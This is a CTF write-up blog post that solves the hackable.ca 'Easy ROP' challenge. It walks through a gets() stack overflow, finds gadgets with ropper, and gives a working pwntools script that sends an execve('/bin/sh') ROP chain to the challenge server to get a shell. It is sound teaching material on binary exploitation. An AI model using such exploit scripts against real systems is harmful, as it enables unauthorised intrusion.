Title: Hackable.ca Easy ROP
Date: 2018-7-30 10:02
Modified: 2018-7-30 10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation, rop
Slug: hackable_ca_easyROP
Authors: F3real
Summary: How to solve hackable.ca Easy ROP

In this post we are going to take a look at one of challenges from [http://hackable.ca/](http://hackable.ca/). It is (not so) Easy ROP challenge. First lets run `file` on binary they provided:

    root@kali:~/ctf/hackable.ca_easyROP# file ropeasy_updated 
    ropeasy_updated: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=61d5d8b74151b4dfa900d5e2d66b9c2e0adcfa85, not stripped

We see it is 32bit non stripped ELF program, since we don’t have source code we can use IDA to get pseudocode (`F5` hotkey while in function).

~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax@1

  v3 = _x86_get_pc_thunk_ax(&argc);
  puts(&aTryRunningBinS[v3 - 134515245]);
  smashMe();
  return 0;
}

int smashMe()
{
  char v1; // [sp+Ch] [bp-Ch]@1

  printf("\nuser input: ");
  fflush(stdout);
  return gets(&v1);
}
~~~

It is really simple executable with obvious overflow in `smashMe` (`gets` function). We are also going to check security features enabled on this binary.

    gdb-peda$ checksec
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial

We see that only NX (Non-executable memory) bit is set. Good thing is that, since PIE is disabled, addresses won’t change which makes our job easier. I am using `checksec` command from `gdb-peda` (really helpful extension for `gdb`), but there is also standalone script for it. Let’s try running the binary:

    root@kali:~/ctf/hackable.ca_easyROP# ./ropeasy_updated

    try running /bin/sh

    user input: test

Program asks us for input and immediately quits. First let’s try to find address of `system` and `/bin/sh`.

    gdb-peda$ p system
    No symbol table is loaded.  Use the "file" command.

It seems that `system` is not linked in this binary. This makes ROP harder but we can use `execve` syscall to run `/bin/sh`. One of other things we have to do is find offset of `EIP`. We can create pattern in `gdb-peda`:

    gdb-peda$ pattern create 20
    'AAA%AAsAABAA$AAnAACA'

When we give this pattern (if it is long enough) to program it will crash with `SIGSEGV` (segmentation fault). This pattern is non-repeatable so we can tell `gdb-peda` to look for it in registers after program segfault and determine offsets.

    gdb-peda$ pattern search

![Easy rop pattern search]({static}/images/2018_7_30_easyRop1.png){: .img-fluid .centerimage}

We see that `EIP` offset is at 16 and that we also have `EBX` at 8. One of things to note is that `gdb` can modify stack a bit (because of environment variables) so it is better to run program and then attach `gdb` to it then to run it inside `gdb`.

To get `execve` syscall we need following arguments:

    EAX      0x0b      //identifies execve syscall
    EBX      /bin/sh
    ECX      0
    EDX      0

To find ROP gadgets we need we are going to use [**ropper**](https://github.com/sashs/Ropper). Lets look for `int 0x80; ret;` first since it is required for syscall.

~~~text
root@kali:~/ctf/hackable.ca_easyROP# ropper --file ropeasy_updated --search "int 0x80; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: int 0x80; ret;

[INFO] File: ropeasy_updated
0x08070470: int 0x80; ret;
~~~

We are going to repeat this procedure to find other gadgets we need as well.

    0x080b94a6: pop eax; ret;
    0x0806feaa: pop edx; ret;  
    0x0806fed1: pop ecx; pop ebx; ret;

Since we couldn’t find simple `pop ecx; ret;` we are using closest one we could find. Procedure to find address for `/bin/sh` is a bit different. All static strings are stored in `.rodata` section (*read-only-data*) in ELF binaries. We can find address using:

    root@kali:~/ctf/hackable.ca_easyROP# objdump -s -j .rodata ./ropeasy_updated  | grep /bin/sh
     80bc660 6e67202f 62696e2f 7368002e 2e2f6373  ng /bin/sh.../cs

We don’t get exact address so we need to add offset (`0x03`). So lets combine all of this together:

    "AAAA"
    "AAAA"  
    "AAAA"
    "AAAA"
    0x080b94a6    # pop eax; ret;
    0x0000000b    # argument for execv
    0x0806feaa    # pop edx; ret;
    0x00000000    # we need 0 in EDX
    0x0806fed1    # pop ecx; pop ebx; ret;
    0x00000000    # we need 0 in ECX
    0x80bc660+0x3 # /bin/sh
    0x08070470    # int 80; ret;

We could have also overwritten `EBX` sooner but, since in gadget for `ECX` we have `pop EBX` again, it is not needed. Now let’s write **pwntools** script implementing this exploit.

~~~python
from pwn import *

context.arch = 'i386'
context.terminal = 'tmux'

r = remote('pwnable.hackable.ca',  9999)
print r.recvuntil('user input: ')

addr_1 = p32(0x80bc660+0x3)   # /bin/sh
addr_2 = p32(0x08070470)      # int 80; ret;
addr_3 = p32(0x080b94a6)      # pop eax; ret;
addr_4 = p32(0x0806feaa)      # pop edx; ret;
addr_5 = p32(0x0806fed1)      # pop ecx; pop ebx; ret; 

payload = "A"*16 + addr_3 + "\x0b" + "\x00"*3 + addr_4 + "\x00"*4 + addr_5 + "\x00"*4 + addr_1 + addr_2
print payload
r.send(payload)
r.interactive()
~~~

And running it, we get the flag :D

![Easy rop flag]({static}/images/2018_7_30_easyRop2.png){: .img-fluid .centerimage}

***

Making ROP chain involves a lot of tinkering and failing so it is really helpful to inspect core files (from segfaults).

    gdb ./ropeasy_updated ./core

After that we can inspect register state at time of crash with `i r` and stack state with `i s`.
